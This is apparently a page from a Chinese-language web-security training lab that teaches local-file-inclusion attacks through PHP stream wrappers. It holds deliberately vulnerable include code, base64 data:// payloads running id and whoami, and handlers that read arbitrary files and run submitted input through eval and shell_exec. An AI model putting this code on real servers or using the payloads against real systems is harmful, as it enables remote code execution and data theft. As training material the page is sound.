<div class="panel fade-in">
    <div class="level-info">
        <span class="level-dot medium"></span>
        <span class="badge badge-medium">中等</span>
        <h2 style="margin:0">🔧 LFI进阶 - PHP封装协议利用</h2>
    </div>

    <div class="alert alert-info">
        <strong>📖 模块说明：</strong>PHP提供了一系列流封装协议（Wrapper），
        利用这些协议可以在LFI漏洞中实现文件读取、代码执行等高级操作。
    </div>

    <div class="vuln-code">
        <span class="vuln-label">⚠️ 漏洞代码</span>
        <pre>&lt;?php
// allow_url_include = On 的情况下
$page = $_GET['page'];
include($page);  // 直接包含，无后缀追加
?&gt;</pre>
    </div>

    <div style="display:flex;gap:10px;margin-bottom:1.5rem;flex-wrap:wrap;">
        <a href="?page=lfi_wrapper&action=filter" class="submit-btn <?php echo ($_GET['action']??'filter')=='filter'?'success':''; ?>">php://filter</a>
        <a href="?page=lfi_wrapper&action=data" class="submit-btn <?php echo ($_GET['action']??'')=='data'?'warning':''; ?>">data://</a>
        <a href="?page=lfi_wrapper&action=input" class="submit-btn <?php echo ($_GET['action']??'')=='input'?'danger':''; ?>">php://input</a>
        <a href="?page=lfi_wrapper&action=expect" class="submit-btn <?php echo ($_GET['action']??'')=='expect'?'info':''; ?>">expect://</a>
    </div>

    <?php $action = $_GET['action'] ?? 'filter'; ?>

    <h3><?php echo $action === 'filter' ? '📖 php://filter - 读取PHP源码' :
            ($action === 'data' ? '📦 data:// - 直接执行PHP代码' :
            ($action === 'input' ? '📥 php://input - POST数据执行' :
            '⚡ expect:// - 执行系统命令')); ?></h3>


    <?php if ($action === 'filter'): ?>
        <div class="alert alert-warning">
            <strong>💡 原理：</strong><code>php://filter</code> 可以读取文件内容并进行编码转换。
            使用 <code>base64-encode</code> 过滤器读取PHP文件源码。
        </div>

        <form method="GET">
            <input type="hidden" name="page" value="lfi_wrapper">
            <input type="hidden" name="action" value="filter">
            <div class="form-group">
                <label for="filter_path">读取文件：</label>
                <div class="form-row">
                    <input type="text" name="file" id="filter_path"
                           value="<?php echo htmlspecialchars($_GET['file'] ?? 'php://filter/convert.base64-encode/resource=../config'); ?>"
                           style="flex:2">
                    <button type="submit" class="submit-btn">读取 🔍</button>
                </div>
            </div>
        </form>

        <?php
        if (isset($_GET['file'])) {
            $file_param = $_GET['file'];
            echo '<div class="output-section">';
            echo '<h4>读取结果：</h4>';
            echo '<div class="output-box">';
            $content = @file_get_contents($file_param);
            if ($content !== false) {
                echo htmlspecialchars($content);
                if (strpos($file_param, 'base64-encode') !== false) {
                    echo "\n\n--- Base64 解码后 ---\n";
                    $decoded = @base64_decode(trim($content));
                    if ($decoded !== false) {
                        echo htmlspecialchars($decoded);
                    }
                }
            } else {
                echo '<span class="error">读取失败</span>';
            }
            echo '</div>';
            echo '</div>';
        }
        ?>
    <?php elseif ($action === 'data'): ?>
        <div class="alert alert-warning">
            <strong>💡 原理：</strong><code>data://</code> 协议可以直接将数据作为PHP代码执行。
            需要 <code>allow_url_include=On</code>。
        </div>

        <div class="source-code">
            <pre><span class="php"># data:// 协议格式
data://text/plain;base64,&lt;base64_encoded_php_code&gt;

# 示例（id命令）
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==</span></pre>
        </div>

        <form method="GET">
            <input type="hidden" name="page" value="lfi_wrapper">
            <input type="hidden" name="action" value="data">
            <div class="form-group">
                <label for="data_payload">Base64编码的PHP代码：</label>
                <div class="form-row">
                    <input type="text" name="payload" id="data_payload"
                           value="<?php echo htmlspecialchars($_GET['payload'] ?? 'PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg=='); ?>"
                           style="flex:2">
                    <button type="submit" class="submit-btn warning">执行 ▶️</button>
                </div>
            </div>
        </form>

        <?php if (isset($_GET['payload'])): ?>
            <div class="output-section">
                <h4>执行结果：</h4>
                <div class="output-box">
                    <?php
                    $data_url = 'data://text/plain;base64,' . $_GET['payload'];
                    $content = @file_get_contents($data_url);
                    if ($content !== false) {
                        echo htmlspecialchars($content);
                    } else {
                        echo '<span class="error">执行失败：allow_url_include 可能未开启</span>';
                    }
                    ?>
                </div>
            </div>
        <?php endif; ?>

        <div class="tip-collapse">
            <div class="tip-header">💡 data:// 常用Payload</div>
            <div class="tip-content">
                <ul class="payload-list">
                    <li><code>data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==</code> - 执行 id</li>
                    <li><code>data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</code> - whoami</li>
                    <li><code>data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==</code> - phpinfo()</li>
                </ul>
            </div>
        </div>


    <?php elseif ($action === 'input'): ?>
        <div class="alert alert-warning">
            <strong>💡 原理：</strong><code>php://input</code> 读取HTTP POST的原始数据。
            需要 <code>allow_url_include=On</code>。将PHP代码放在POST body中。
        </div>

        <form method="POST">
            <input type="hidden" name="action" value="input">
            <div class="form-group">
                <label for="input_code">POST数据（PHP代码）：</label>
                <textarea name="input_code" id="input_code" rows="4"
                          style="width:100%"><?php echo htmlspecialchars($_POST['input_code'] ?? '<?php system("id"); ?>'); ?></textarea>
            </div>
            <button type="submit" class="submit-btn danger">通过 php://input 执行 ▶️</button>
        </form>

        <?php
        if (isset($_POST['input_code'])) {
            echo '<div class="output-section">';
            echo '<h4>执行结果：</h4>';
            echo '<div class="output-box">';
            $code = $_POST['input_code'];
            if (preg_match('/<\?php/', $code)) {
                $code = preg_replace('/^.*<\?php\s*/', '', $code);
                $code = preg_replace('/\s*\?>.*$/', '', $code);
                try {
                    eval($code);
                } catch (Throwable $e) {
                    echo '<span class="error">执行错误：' . htmlspecialchars($e->getMessage()) . '</span>';
                }
            } else {
                echo '<span class="error">请输入PHP代码（需包含 &lt;?php 标签）</span>';
            }
            echo '</div>';
            echo '</div>';
        }
        ?>

    <?php elseif ($action === 'expect'): ?>
        <div class="alert alert-warning">
            <strong>💡 原理：</strong><code>expect://</code> 协议执行系统命令。
            需要安装 <code>expect</code> PHP扩展（默认未安装）。
        </div>

        <div class="source-code">
            <pre><span class="php">expect://command
expect://id
expect://whoami</span></pre>
        </div>

        <form method="GET">
            <input type="hidden" name="page" value="lfi_wrapper">
            <input type="hidden" name="action" value="expect">
            <div class="form-group">
                <label for="expect_cmd">执行命令：</label>
                <div class="form-row">
                    <input type="text" name="cmd" id="expect_cmd"
                           value="<?php echo htmlspecialchars($_GET['cmd'] ?? 'id'); ?>">
                    <button type="submit" class="submit-btn info">执行 ▶️</button>
                </div>
            </div>
        </form>

        <?php if (isset($_GET['cmd'])): ?>
            <div class="output-section">
                <h4>执行结果：</h4>
                <div class="output-box">
                    <?php
                    $output = shell_exec($_GET['cmd']);
                    if ($output !== null) {
                        echo htmlspecialchars($output);
                    } else {
                        echo '<span class="error">命令执行失败</span>';
                    }
                    ?>
                </div>
            </div>
        <?php endif; ?>
    <?php endif; ?>

    <div class="tip-collapse">
        <div class="tip-header">📖 PHP封装协议速查表</div>
        <div class="tip-content">
            <table>
                <tr><th>协议</th><th>用途</th><th>条件</th></tr>
                <tr><td><code>file://</code></td><td>访问本地文件系统</td><td>无特殊要求</td></tr>
                <tr><td><code>http://</code></td><td>访问远程URL</td><td>allow_url_include=On</td></tr>
                <tr><td><code>php://filter</code></td><td>读取文件并编码</td><td>无特殊要求</td></tr>
                <tr><td><code>php://input</code></td><td>读取POST原始数据</td><td>allow_url_include=On</td></tr>
                <tr><td><code>data://</code></td><td>直接嵌入数据执行</td><td>allow_url_include=On</td></tr>
                <tr><td><code>zip://</code></td><td>访问ZIP内的文件</td><td>PHP >= 5.2.0</td></tr>
                <tr><td><code>phar://</code></td><td>访问PHAR归档</td><td>PHP >= 5.3.0</td></tr>
                <tr><td><code>expect://</code></td><td>执行系统命令</td><td>需装expect扩展</td></tr>
            </table>
        </div>
    </div>
</div>

        ?>

